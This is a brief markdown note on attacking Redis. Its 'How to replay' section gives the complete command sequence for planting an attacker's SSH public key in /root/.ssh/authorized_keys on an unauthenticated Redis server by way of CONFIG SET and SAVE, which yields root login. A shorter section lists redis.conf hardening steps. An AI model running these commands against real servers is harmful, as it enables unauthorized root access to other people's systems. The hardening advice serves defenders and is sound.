
---
title: "Redis Hack"
---

## Remote login 

### How to replay

```shell
ssh-keygen –t rsa
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo
$ cat foo | redis-cli -h $remote_ip -x set crack
$ redis-cli -h $remote_ip
# in redis CLI
config set dir /root/.ssh/
config get dir
config set dbfilename "authorized_keys"
# save /root/.ssh/authorized_keys
save
```

### How to avoid

```shell
# redis.conf
# disable to change dbfilename via remote connetion
rename-command FLUSHALL ""
rename-command CONFIG   ""
rename-command EVAL     ""
requirepass mypassword
bind 127.0.0.1

groupadd -r redis && useradd -r -g redis redis
```
